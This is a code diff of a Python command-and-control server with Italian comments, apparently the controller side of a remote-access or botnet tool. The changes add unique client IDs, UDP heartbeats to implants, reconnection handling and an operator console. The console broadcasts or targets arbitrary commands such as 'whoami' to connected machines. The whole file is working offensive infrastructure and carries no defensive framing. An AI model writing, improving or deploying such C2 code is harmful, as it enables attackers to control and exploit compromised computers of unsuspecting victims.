@@ -3,266 +3,286 @@ import socket
 import threading
 import time
 import sys
+import queue
 from Client import Client
 
+
 class C2Server:
-    def __init__(self, host='0.0.0.0', port=4444):
+    def __init__(self, host='0.0.0.0', command_port=4444, heartbeat_port=4445):
         self.host = host
-        self.port = port
-        self.clients = [] # Client(socket, address, hostname, last_seen)
-        self.lock = threading.Lock()
+        self.command_port = command_port
+        self.heartbeat_port = heartbeat_port
+
+        self.clients = {}              # unique_id -> Client
+        self.lock = threading.Lock()   # protegge self.clients
         self.running = True
-    
+
+        self.heartbeat_interval = 10
+        self.client_retention = 60 * 60
+
+        # logging
+        self.print_queue = queue.Queue()
+
+    # ---------------- LOGGING ----------------
+    def log(self, msg):
+        self.print_queue.put(msg)
+
+    def printer(self):
+        while self.running or not self.print_queue.empty():
+            try:
+                msg = self.print_queue.get(timeout=1)
+                print(msg)
+            except queue.Empty:
+                continue
+
+    # ---------------- HEARTBEAT ----------------
+    def heartbeat_sender(self):
+        hb_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        self.log(f"[*] Heartbeat thread started (interval {self.heartbeat_interval}s)")
+
+        while self.running:
+            try:
+                with self.lock:
+                    snapshot = list(self.clients.values())
+
+                failed = []
+
+                for client in snapshot:
+                    with client.lock:
+                        if not client.active:
+                            continue
+                        ip = client.ip
+                        port = client.heartbeat_port
+
+                    try:
+                        msg = f"HEARTBEAT|{ip}|{int(time.time())}"
+                        hb_socket.sendto(msg.encode(), (ip, port))
+                    except Exception as e:
+                        self.log(f"[!] Heartbeat failed to {ip}:{port} ({client.unique_id[:8]}...): {e}")
+                        failed.append(client)
+
+                for client in failed:
+                    client.close()
+
+                time.sleep(self.heartbeat_interval)
+
+            except Exception as e:
+                self.log(f"[!] Heartbeat thread error: {e}")
+                time.sleep(5)
+
+        hb_socket.close()
+        self.log("[*] Heartbeat thread exiting")
+
+    # ---------------- CLIENT HANDLER ----------------
     def handle_client(self, client_socket, address):
-        """Gestisce una connessione client"""
         ip, port = address
         client_id = f"{ip}:{port}"
+        client_obj = None
 
-        # Send only handshake if client already exists
-        for existing_client in self.clients:
-            if existing_client.ip == ip:
-                existing_client.socket = client_socket
-                existing_client.socket.send(b"READY\n")
-                return
-        
         try:
-            print(f"[+] Client connected: {client_id}")
-            
-            # 1. Ricevi handshake (CON TIMEOUT)
-            client_socket.settimeout(5.0)
-            try:
-                data = client_socket.recv(1024).decode().strip()
-                print(f"[+] Handshake received: {data}")
-                
-                if not data.startswith("HELLO|"):
-                    print(f"[-] Bad handshake from {client_id}")
-                    client_socket.close()
-                    return
-                
-                # Estrai hostname
-                parts = data.split('|')
-                hostname = parts[1] if len(parts) > 1 else "unknown"
-                
-            except socket.timeout:
-                print(f"[-] {client_id} handshake timeout")
+            self.log(f"[+] Incoming connection from {client_id}")
+            client_socket.settimeout(10.0)
+
+            data = client_socket.recv(1024).decode().strip()
+            if not data.startswith("HELLO|"):
+                self.log(f"[-] Bad handshake from {client_id}")
                 client_socket.close()
                 return
-            
-            # 2. Invia READY (IMPORTANTE: il client lo aspetta!)
-            print(f"[+] Sending READY to {client_id}")
-            client_socket.send(b"READY\n")
-            
-            # 3. Registra client
-            with self.lock:
-                self.clients.append(Client(client_socket, address, hostname, time.time()))
-            
-            print(f"[+] Client registered: {client_id} ({hostname})")
-            print(f"[+] Total clients: {len(self.clients)}")
-            
-            # 4. Loop per ricevere risposte ai comandi
-            while self.running:
+
+            parts = data.split('|')
+            if len(parts) < 4:
+                self.log(f"[-] Malformed handshake from {client_id}")
+                client_socket.close()
+                return
+
+            hostname = parts[1]
+            unique_id = parts[3]
+            heartbeat_port = self.heartbeat_port
+
+            if len(parts) >= 5:
                 try:
-                    # Ricevi risposte (timeout breve 0.5 o più alto)
-                    client_socket.settimeout(1.0)
-                    try:
-                        data = client_socket.recv(8192)
-                        if data:
-                            # Questa è una risposta a un comando broadcast
-                            output = data.decode('utf-8', errors='ignore').rstrip()
-                            print(f"[{client_id}] Response: {output[:100]}...")
-                            
-                            # Aggiorna last_seen
-                            with self.lock:
-                                for client in self.clients:
-                                    if client.socket == client_socket:
-                                        client.set_time(time.time())
-                                        break
-                    except socket.timeout:
-                        continue  # Nessun dato, continua
-                    except:
-                        break  # Errore, esci
-                        
-                except Exception as e:
-                    print(f"[-] {client_id} error in loop: {e}")
-                    break
-                    
-        except Exception as e:
-            print(f"[-] {client_id} error: {e}")
-        finally:
-            # Rimuovi client
+                    heartbeat_port = int(parts[4])
+                except:
+                    pass
+
+            if len(unique_id) != 32:
+                client_socket.send(b"ERROR: Invalid client ID\n")
+                client_socket.close()
+                return
+
             with self.lock:
-                self.clients = [c for c in self.clients if c.socket != client_socket]
-            
+                existing = self.clients.get(unique_id)
+
+            if existing:
+                with existing.lock:
+                    if existing.active:
+                        self.log(f"[!] Duplicate active client {unique_id[:8]}...")
+                        client_socket.send(b"ERROR: Duplicate connection\n")
+                        client_socket.close()
+                        return
+
+                existing.update_connection(client_socket, address, heartbeat_port)
+                with existing.lock:
+                    existing.hostname = hostname
+                client_obj = existing
+                self.log(f"[*] Client reconnected {unique_id[:8]}...")
+
+            else:
+                client_obj = Client(
+                    client_socket,
+                    address,
+                    hostname,
+                    time.time(),
+                    unique_id,
+                    heartbeat_port
+                )
+                with self.lock:
+                    self.clients[unique_id] = client_obj
+                self.log(f"[+] Registered new client {unique_id[:8]}...")
+
+            with client_obj.lock:
+                client_obj.socket.send(b"READY\n")
+
+            client_obj.socket.settimeout(1.0)
+
+            while self.running:
+                with client_obj.lock:
+                    if not client_obj.active:
+                        break
+                    sock = client_obj.socket
+
+                try:
+                    data = sock.recv(8192)
+                    if not data:
+                        break
+
+                    output = data.decode(errors='ignore').rstrip()
+                    self.log(f"[{client_obj.unique_id[:8]}...] {output[:200]}")
+                    client_obj.set_time(time.time())
+
+                except socket.timeout:
+                    continue
+                except Exception:
+                    break
+
+        finally:
+            if client_obj:
+                client_obj.close()
             try:
                 client_socket.close()
             except:
                 pass
-            
-            print(f"[-] Client disconnected: {client_id}")
-            print(f"[-] Remaining clients: {len(self.clients)}")
-    
+            self.log(f"[-] Connection closed {client_id}")
+
+    # ---------------- COMMANDS ----------------
     def broadcast_command(self, command):
-        """Invia comando a tutti i client"""
-        results = []
-        dead_clients = []
-        
         with self.lock:
-            clients_copy = self.clients.copy()
-        
-        print(f"\n[*] Broadcasting '{command}' to {len(clients_copy)} clients")
-        
-        for client_copy in clients_copy: #client_socket, address, hostname, _
-            client_id = f"{client_copy.ip}:{client_copy.port}"
-            
-            try:
-                print(f"  -> Sending to {client_id}...")
-                client_copy.socket.send((command + '\n').encode())
-                results.append((client_id, client_copy.hostname, "SENT"))
-                
-            except Exception as e:
-                print(f"  x Failed to send to {client_id}: {e}")
-                dead_clients.append(client_copy.socket)
-                results.append((client_id, client_copy.hostname, f"ERROR: {e}"))
-        
-        # Rimuovi client morti
-        for client_socket in dead_clients:
-            with self.lock:
-                self.clients = [c for c in self.clients if c[0] != client_socket]
-        
-        return results
+            clients = list(self.clients.values())
 
-    def client_command(self, ip, command):
+        for client in clients:
+            with client.lock:
+                if not client.active:
+                    continue
+                try:
+                    client.socket.send((command + '\n').encode())
+                    client.set_time(time.time())
+                except Exception as e:
+                    self.log(f"[!] Send failed to {client.ip}: {e}")
+                    client.close()
+
+    def client_command(self, uid_prefix, command):
         target = None
-        result = None
-        dead = None
+        with self.lock:
+            matches = [c for uid, c in self.clients.items()
+                       if uid.startswith(uid_prefix) and c.active]
+            if len(matches) == 1:
+                target = matches[0]
 
-        for client in self.clients:
-            if client.ip == ip:
-                target = client
-        if target is None:
-            print("[ERR:] Please specify a valid client IP. Use list command to see all avilabe clients")
+        if not target:
+            self.log("[ERR] Client not found or ambiguous")
+            return
 
-        print(f"\n[*] Sending '{command}' to {target.ip}")
+        with target.lock:
+            try:
+                target.socket.send((command + '\n').encode())
+                target.set_time(time.time())
+            except Exception:
+                target.close()
 
-        client_id = f"{target.ip}:{target.port}"
-        try:
-            print(f"  -> Sending to {client_id}...")
-            target.socket.send((command + '\n').encode())
-            result = (client_id, target.hostname, "SENT")
-
-        except Exception as e:
-            print(f"  x Failed to send to {client_id}: {e}")
-            dead = target.socket
-            result = (client_id, target.hostname, f"ERROR: {e}")
-
-        # Rimuovi client morti
-        if dead is not None:
-            with self.lock:
-                self.clients.remove(target)
-
-        return [result]
-
-    
+    # ---------------- CONSOLE ----------------
     def console(self):
-        """Console interattiva"""
-        print("\n" + "="*60)
-        print("C2 SERVER - Type commands and press ENTER")
-        print("Commands: list, broadcast <cmd>, exit")
-        print("Example: broadcast whoami")
-        print("="*60)
-        
+        print("\nC2 SERVER")
+        print("Commands: list, broadcast <cmd>, client <id> <cmd>, exit")
+
         while self.running:
             try:
-                cmd = input("\nC2> ").strip()
-                
+                cmd = input("C2> ").strip()
                 if not cmd:
                     continue
-                
-                if cmd.lower() == 'exit':
-                    print("[*] Shutting down server...")
+
+                if cmd == "exit":
                     self.running = False
                     break
-                
-                elif cmd.lower() == 'list':
+
+                elif cmd == "list":
                     with self.lock:
-                        if not self.clients:
-                            print("[!] No clients connected")
-                        else:
-                            print(f"\nConnected clients ({len(self.clients)}):")
-                            for i, client in enumerate(self.clients):
-                                idle = int(time.time() - client.last_seen)
-                                print(f"  {i+1}. {client.ip}:{client.port} - {client.hostname} (idle: {idle}s)")
-                
-                elif cmd.lower().startswith('broadcast '):
-                    command = cmd[10:].strip() # Extract command (len "broadcast "= 10)
-                    if not command:
-                        print("[ERR:] Specify a command")
-                        continue
-                    
-                    results = self.broadcast_command(command)
-                    
-                    print(f"\n[*] Command sent to {len(results)} clients")
-                    print("[*] Responses will appear above as they arrive")
-                    print("[*] Type 'list' to see updated client status")
+                        for c in self.clients.values():
+                            with c.lock:
+                                state = "ACTIVE" if c.active else "INACTIVE"
+                                idle = int(time.time() - c.last_seen)
+                                print(f"{c.unique_id} -> {c.ip}:{c.port} {state} idle:{idle}s")
 
-                elif cmd.lower().startswith('client '):
-                    ip_com = cmd[7:].strip()
-                    ip_com_index = ip_com.index(' ')
-                    ip = ip_com[:ip_com_index].strip()
-                    command = ip_com[ip_com_index:].strip()
+                elif cmd.startswith("broadcast "):
+                    self.broadcast_command(cmd[len("broadcast "):])
 
-                    if not ip or not command:
-                        print("[ERR:] specify an IP and a command")
-                        continue
-                    results = self.client_command(ip, command)
-                    print("[*] Responses will appear above as it arrives")
+                elif cmd.startswith("client "):
+                    _, rest = cmd.split(" ", 1)
+                    uid, command = rest.split(" ", 1)
+                    self.client_command(uid, command)
 
-                
                 else:
-                    print(f"[!] Unknown command: {cmd}")
-                    print("    Available: list, broadcast <cmd>, client <ip> <cmd>, exit")
-                    
+                    print("Unknown command")
+
             except (EOFError, KeyboardInterrupt):
-                print("\n[*] Exiting...")
                 self.running = False
                 break
-    
+
+    # ---------------- START ----------------
     def start(self):
-        """Avvia il server"""
+        printer = threading.Thread(target=self.printer, daemon=True)
+        printer.start()
+
+        hb = threading.Thread(target=self.heartbeat_sender, daemon=True)
+        hb.start()
+
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        server.bind((self.host, self.port))
-        server.listen(10)
-        
-        print(f"[*] C2 Server started on {self.host}:{self.port}")
-        print("[*] Waiting for clients to connect...")
-        
-        # Thread per accettare connessioni
+        server.bind((self.host, self.command_port))
+        server.listen(50)
+
+        self.log(f"[*] Server listening on {self.command_port}")
+
         def accept_loop():
             while self.running:
                 try:
-                    client_socket, address = server.accept()
-                    thread = threading.Thread(
-                        target=self.handle_client,
-                        args=(client_socket, address),
-                        daemon=True
-                    )
-                    thread.start()
+                    sock, addr = server.accept()
+                    t = threading.Thread(target=self.handle_client, args=(sock, addr), daemon=True)
+                    t.start()
                 except:
-                    break  # Server chiuso
-        
-        accept_thread = threading.Thread(target=accept_loop, daemon=True)
-        accept_thread.start()
-        
-        # Avvia console
+                    break
+
+        threading.Thread(target=accept_loop, daemon=True).start()
         self.console()
-        
-        # Cleanup
+
         self.running = False
         server.close()
-        print("[*] Server stopped")
+
+        with self.lock:
+            for c in self.clients.values():
+                c.close()
+
+        self.log("[*] Server stopped")
 
 
 if __name__ == "__main__":
-    server = C2Server()
-    server.start()
+    C2Server().start()
